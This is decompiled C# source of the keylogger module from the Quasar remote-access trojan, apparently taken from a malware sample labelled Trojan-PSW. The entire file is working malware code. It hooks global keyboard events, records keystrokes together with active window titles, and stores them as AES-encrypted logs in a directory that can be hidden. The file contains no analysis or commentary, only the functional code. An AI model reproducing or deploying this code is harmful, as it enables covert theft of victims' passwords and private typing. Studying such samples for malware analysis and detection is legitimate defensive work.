// Decompiled with JetBrains decompiler
// Type: Quasar.Client.Logging.Keylogger
// Assembly: Client, Version=1.4.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 73C3C7FC-0EA2-48C4-8CEF-33A8CFDA287C
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\Trojan-PSW.MSIL.Agent.anew-0b84e664c8b592aa0220d52841629b2accb41f1f624720331000ab5f2f0ed628.exe

using Gma.System.MouseKeyHook;
using Quasar.Client.Config;
using Quasar.Client.Extensions;
using Quasar.Client.Helper;
using Quasar.Common.Cryptography;
using Quasar.Common.Helpers;
using System;
using System.Collections.Generic;
using System.Globalization;
using System.IO;
using System.Text;
using System.Timers;
using System.Web;
using System.Windows.Forms;

namespace Quasar.Client.Logging
{
  public class Keylogger : IDisposable
  {
    private readonly System.Timers.Timer _timerFlush;
    private readonly StringBuilder _logFileBuffer = new StringBuilder();
    private readonly List<Keys> _pressedKeys = new List<Keys>();
    private readonly List<char> _pressedKeyChars = new List<char>();
    private string _lastWindowTitle = string.Empty;
    private bool _ignoreSpecialKeys;
    private readonly IKeyboardMouseEvents _mEvents;
    private readonly Aes256 _aesInstance = new Aes256(Settings.ENCRYPTIONKEY);
    private readonly long _maxLogFileSize;

    public bool IsDisposed { get; private set; }

    public Keylogger(double flushInterval, long maxLogFileSize)
    {
      this._maxLogFileSize = maxLogFileSize;
      this._mEvents = Hook.GlobalEvents();
      this._timerFlush = new System.Timers.Timer()
      {
        Interval = flushInterval
      };
      this._timerFlush.Elapsed += new ElapsedEventHandler(this.TimerElapsed);
    }

    public void Start()
    {
      this.Subscribe();
      this._timerFlush.Start();
    }

    public void Dispose()
    {
      this.Dispose(true);
      GC.SuppressFinalize((object) this);
    }

    protected virtual void Dispose(bool disposing)
    {
      if (this.IsDisposed)
        return;
      if (disposing)
      {
        this.Unsubscribe();
        this._timerFlush.Stop();
        this._timerFlush.Dispose();
        this._mEvents.Dispose();
        this.WriteFile();
      }
      this.IsDisposed = true;
    }

    private void Subscribe()
    {
      this._mEvents.KeyDown += new KeyEventHandler(this.OnKeyDown);
      this._mEvents.KeyUp += new KeyEventHandler(this.OnKeyUp);
      this._mEvents.KeyPress += new KeyPressEventHandler(this.OnKeyPress);
    }

    private void Unsubscribe()
    {
      this._mEvents.KeyDown -= new KeyEventHandler(this.OnKeyDown);
      this._mEvents.KeyUp -= new KeyEventHandler(this.OnKeyUp);
      this._mEvents.KeyPress -= new KeyPressEventHandler(this.OnKeyPress);
    }

    private void OnKeyDown(object sender, KeyEventArgs e)
    {
      string foregroundWindowTitle = NativeMethodsHelper.GetForegroundWindowTitle();
      if (!string.IsNullOrEmpty(foregroundWindowTitle) && foregroundWindowTitle != this._lastWindowTitle)
      {
        this._lastWindowTitle = foregroundWindowTitle;
        this._logFileBuffer.Append("<p class=\"h\"><br><br>[<b>" + HttpUtility.HtmlEncode(foregroundWindowTitle) + " - " + DateTime.UtcNow.ToString("t", (IFormatProvider) DateTimeFormatInfo.InvariantInfo) + " UTC</b>]</p><br>");
      }
      if (this._pressedKeys.ContainsModifierKeys() && !this._pressedKeys.Contains(e.KeyCode))
      {
        this._pressedKeys.Add(e.KeyCode);
      }
      else
      {
        if (e.KeyCode.IsExcludedKey() || this._pressedKeys.Contains(e.KeyCode))
          return;
        this._pressedKeys.Add(e.KeyCode);
      }
    }

    private void OnKeyPress(object sender, KeyPressEventArgs e)
    {
      if (this._pressedKeys.ContainsModifierKeys() && this._pressedKeys.ContainsKeyChar(e.KeyChar) || this._pressedKeyChars.Contains(e.KeyChar) && this.DetectKeyHolding(this._pressedKeyChars, e.KeyChar) || this._pressedKeys.ContainsKeyChar(e.KeyChar))
        return;
      string str = HttpUtility.HtmlEncode(e.KeyChar.ToString());
      if (string.IsNullOrEmpty(str))
        return;
      if (this._pressedKeys.ContainsModifierKeys())
        this._ignoreSpecialKeys = true;
      this._pressedKeyChars.Add(e.KeyChar);
      this._logFileBuffer.Append(str);
    }

    private void OnKeyUp(object sender, KeyEventArgs e)
    {
      this._logFileBuffer.Append(this.HighlightSpecialKeys(this._pressedKeys.ToArray()));
      this._pressedKeyChars.Clear();
    }

    private bool DetectKeyHolding(List<char> list, char search) => list.FindAll((Predicate<char>) (s => s.Equals(search))).Count > 1;

    private string HighlightSpecialKeys(Keys[] keys)
    {
      if (keys.Length < 1)
        return string.Empty;
      string[] strArray = new string[keys.Length];
      for (int index = 0; index < keys.Length; ++index)
      {
        if (!this._ignoreSpecialKeys)
        {
          strArray[index] = keys[index].GetDisplayName();
        }
        else
        {
          strArray[index] = string.Empty;
          this._pressedKeys.Remove(keys[index]);
        }
      }
      this._ignoreSpecialKeys = false;
      if (this._pressedKeys.ContainsModifierKeys())
      {
        StringBuilder stringBuilder = new StringBuilder();
        int num = 0;
        for (int index = 0; index < strArray.Length; ++index)
        {
          this._pressedKeys.Remove(keys[index]);
          if (!string.IsNullOrEmpty(strArray[index]))
          {
            stringBuilder.AppendFormat(num == 0 ? "<p class=\"h\">[{0}" : " + {0}", (object) strArray[index]);
            ++num;
          }
        }
        if (num > 0)
          stringBuilder.Append("]</p>");
        return stringBuilder.ToString();
      }
      StringBuilder stringBuilder1 = new StringBuilder();
      for (int index = 0; index < strArray.Length; ++index)
      {
        this._pressedKeys.Remove(keys[index]);
        if (!string.IsNullOrEmpty(strArray[index]))
        {
          string str = strArray[index];
          if (!(str == "Return"))
          {
            if (str == "Escape")
              stringBuilder1.Append("<p class=\"h\">[Esc]</p>");
            else
              stringBuilder1.Append("<p class=\"h\">[" + strArray[index] + "]</p>");
          }
          else
            stringBuilder1.Append("<p class=\"h\">[Enter]</p><br>");
        }
      }
      return stringBuilder1.ToString();
    }

    private void TimerElapsed(object sender, ElapsedEventArgs e)
    {
      if (this._logFileBuffer.Length <= 0)
        return;
      this.WriteFile();
    }

    private void WriteFile()
    {
      bool flag = false;
      string str = Path.Combine(Settings.LOGSPATH, DateTime.UtcNow.ToString("yyyy-MM-dd"));
      try
      {
        DirectoryInfo directoryInfo = new DirectoryInfo(Settings.LOGSPATH);
        if (!directoryInfo.Exists)
          directoryInfo.Create();
        if (Settings.HIDELOGDIRECTORY)
          directoryInfo.Attributes = FileAttributes.Hidden | FileAttributes.Directory;
        int num = 1;
        while (File.Exists(str) && new FileInfo(str).Length >= this._maxLogFileSize)
        {
          string path2 = string.Format("{0}_{1}", (object) Path.GetFileName(str), (object) num);
          str = Path.Combine(Settings.LOGSPATH, path2);
          ++num;
        }
        if (!File.Exists(str))
          flag = true;
        StringBuilder stringBuilder = new StringBuilder();
        if (flag)
        {
          stringBuilder.Append("<meta http-equiv='Content-Type' content='text/html; charset=utf-8' />Log created on " + DateTime.UtcNow.ToString("f", (IFormatProvider) DateTimeFormatInfo.InvariantInfo) + " UTC<br><br>");
          stringBuilder.Append("<style>.h { color: 0000ff; display: inline; }</style>");
          this._lastWindowTitle = string.Empty;
        }
        if (this._logFileBuffer.Length > 0)
          stringBuilder.Append((object) this._logFileBuffer);
        FileHelper.WriteLogFile(str, stringBuilder.ToString(), this._aesInstance);
        stringBuilder.Clear();
      }
      catch
      {
      }
      this._logFileBuffer.Clear();
    }
  }
}
